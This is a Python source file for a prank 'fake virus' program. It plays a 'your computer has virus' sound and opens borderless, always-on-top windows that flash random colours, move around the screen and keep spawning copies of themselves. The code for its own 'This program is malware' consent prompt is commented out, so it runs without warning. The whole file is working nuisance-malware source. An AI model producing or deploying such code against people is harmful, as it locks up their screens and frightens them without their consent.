import tkinter as tk
from tkinter import messagebox
import random
import pygame
import os
from screeninfo import get_monitors

warning_accepted = False

class MovingWindow:

    def __init__(self, master):
        global warning_accepted
        # Display the warning only if it has not been accepted
        # if not warning_accepted:
        #     self.show_warning()

        self.master = master
        self.master.title("Moving Window")
        self.master.geometry("100x100")

        monitors = get_monitors()


        # Start the movement and duplication for each monitor
        # for monitor in monitors:
        #     self.create_duplicate_window(monitor)

        # Start the movement and duplication
        self.start_move()
        self.master.after(1, self.duplicate_window)

    def show_warning(self):
        # Display a warning and ask for user confirmation
        response = messagebox.askyesno("Warning", "This program is malware. Do you want to proceed?")
        if response:
            warning_accepted = True
            pass
        else:
            self.master.destroy()


    def start_move(self):
        self.move_window_smooth()

    def move_window_smooth(self, steps=5, duration=1):
        initial_x = self.master.winfo_x()
        initial_y = self.master.winfo_y()

        # Adjust target coordinates based on the total screen area
        target_x = random.randint(0, self.master.winfo_screenwidth() - 100)
        target_y = random.randint(0, self.master.winfo_screenheight() - 100)

        x_step = (target_x - initial_x) / steps
        y_step = (target_y - initial_y) / steps

        self.move_smooth_recursive(initial_x, initial_y, x_step, y_step, steps, duration)

    def move_smooth_recursive(self, current_x, current_y, x_step, y_step, steps_left, duration):
        if steps_left > 0:
            self.master.geometry(f"100x100+{int(current_x)}+{int(current_y)}")
            
            # Set a random background color
            random_color = "#{:06x}".format(random.randint(0, 0xFFFFFF))
            self.master.configure(bg=random_color)
            
            self.master.after(int(duration / 50),
                              lambda: self.move_smooth_recursive(current_x + x_step, current_y + y_step,
                                                                   x_step, y_step, steps_left - 1, duration))

    def duplicate_window(self):
        if not hasattr(self, "duplicated"):
            new_window = tk.Toplevel(self.master)
            new_window.overrideredirect(True)
            new_window.attributes("-topmost", True)
            new_window.geometry("100x100+0+0")
            MovingWindow(new_window)
            self.duplicated = True  # Mark that the window has been duplicated

    def reset_duplicated(self):
        self.duplicated = False

def main():
    pygame.init()
    pygame.mixer.init()

    # Load the music file
    # music_file = "you-are-an-idiot.mp3"  # Replace with the correct path to your music file
    music_file="hello-your-computer-has-virus-sound-effect.mp3"
    
    if os.path.exists(music_file):
        pygame.mixer.music.load(music_file)
        pygame.mixer.music.play()

    else:
        print(f"Error: The music file '{music_file}' does not exist.")

    root = tk.Tk()
    root.geometry("200x200")
    root.title("Program Starter")

    program_starter = MovingWindow(root)

    root.mainloop()

if __name__ == "__main__":
    main()
